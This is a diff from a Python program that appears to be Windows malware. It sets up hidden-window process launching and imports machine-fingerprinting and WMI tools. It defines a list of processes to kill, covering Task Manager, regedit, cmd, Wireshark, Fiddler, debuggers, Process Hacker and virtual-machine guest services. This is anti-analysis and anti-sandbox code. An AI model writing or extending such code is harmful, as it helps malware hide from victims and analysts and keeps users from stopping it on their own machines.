@@ -4,15 +4,16 @@ from subprocess import check_output, PIPE
 from psutil import process_iter
 from uuid import UUID, getnode
 from wmi import WMI
-from subprocess import check_output, DEVNULL
+from subprocess import check_output, DEVNULL, STARTUPINFO, STARTF_USESHOWWINDOW
 from requests import get
 from platform import system
 from json import loads
 from manager.blacklist import BlackList
-from manager.manager import HIDDEN_WINDOW
 from preferences.config import config
 
 
+HIDDEN_WINDOW = STARTUPINFO()
+HIDDEN_WINDOW.dwFlags |= STARTF_USESHOWWINDOW
 
 kill_Processes =["httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
 
